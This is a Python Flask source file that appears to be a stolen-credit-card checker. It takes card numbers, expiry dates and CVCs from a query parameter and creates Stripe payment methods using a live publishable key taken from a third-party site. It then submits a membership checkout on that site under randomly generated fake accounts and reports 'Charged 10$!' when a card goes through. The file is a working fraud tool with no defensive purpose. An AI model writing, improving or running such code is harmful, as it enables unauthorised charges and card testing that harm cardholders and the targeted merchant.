from flask import Flask, request, jsonify
import requests
import random
import string
from bs4 import BeautifulSoup

app = Flask(__name__)

@app.route('/checker', methods=['GET'])
def checker():
    lista = request.args.get('lista')
    if lista:
        card_details = lista.split('|')
        payment_method_id, last_four_digits, expiration_month, expiration_year = create_payment_method(card_details)
        
        if payment_method_id:
            return jsonify({'message': membership_checkout(payment_method_id, last_four_digits, expiration_month, expiration_year)})
        else:
            return jsonify({'error': "Invalid card details format. Please enter the details in the specified format."})
    else:
        return jsonify({'error': "No 'lista' parameter provided"})

def create_payment_method(card_details):
    if len(card_details) == 4:
        card_number, exp_month, exp_year, cvc = card_details
        
        url = "https://api.stripe.com/v1/payment_methods"
        payload = f"type=card&card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}&payment_user_agent=stripe.js%2Fa254802e3b%3B+stripe-js-v3%2Fa254802e3b%3B+split-card-element&referrer=https%3A%2F%2Fecstest.net&key=pk_live_51HdlIAIp3rQqxTHDy00d0h4a1Ug7VESCtZKMWKLw1Ltr2UtjyS0HaFYKuf6b2PmZPB4A5fsZYp6quGHl1PyYq1MK00vom2WR7s"
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
        }
        response = requests.post(url, data=payload, headers=headers)
        response_json = response.json()
        
        if 'id' in response_json and 'card' in response_json:
            payment_method_id = response_json.get('id')
            last_four_digits = response_json['card'].get('last4')
            expiration_month = response_json['card'].get('exp_month')
            expiration_year = response_json['card'].get('exp_year')
            brand = response_json['card'].get('brand')
            return payment_method_id, last_four_digits, expiration_month, expiration_year
        else:
            return None, None, None, None
    else:
        return None, None, None, None

def membership_checkout(payment_method_id, last_four_digits, expiration_month, expiration_year):
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=12))

    email_domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    email_domain = random.choice(email_domains)
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + email_domain
    
    url = "https://ecstest.net/membership-checkout/"
    params = {'level': "7"}
    payload = {
        'level': "7",
        'checkjavascript': "1",
        'username': username,
        'password': password,
        'password2': password,
        'bemail': email,
        'bconfirmemail': email,
        'gateway': "stripe",
        'CardType': brand,
        'submit-checkout': "1",
        'javascriptok': "1",
        'payment_method_id': payment_method_id,
        'AccountNumber': f"XXXXXXXXXXXX{last_four_digits}",
        'ExpirationMonth': expiration_month,
        'ExpirationYear': expiration_year
    }

    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
      'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      'Content-Type': "application/x-www-form-urlencoded",
      'sec-ch-ua': "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
      'sec-ch-ua-mobile': "?1",
      'sec-ch-ua-platform': "\"Android\"",
      'origin': "https://ecstest.net",
      'dnt': "1",
      'upgrade-insecure-requests': "1",
      'sec-fetch-site': "same-origin",
      'sec-fetch-mode': "navigate",
      'sec-fetch-user': "?1",
      'sec-fetch-dest': "document",
      'referer': "https://ecstest.net/membership-checkout/?level=7",
    }

    response = requests.post(url, params=params, data=payload, headers=headers)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    alert_div = soup.find('div', {'role': 'alert', 'id': 'pmpro_message', 'class': 'pmpro_message pmpro_error'})
    if alert_div:
        return alert_div.text.strip()
    else:
        return "Charged 10$!"

if __name__ == '__main__':
    app.run(debug=True)
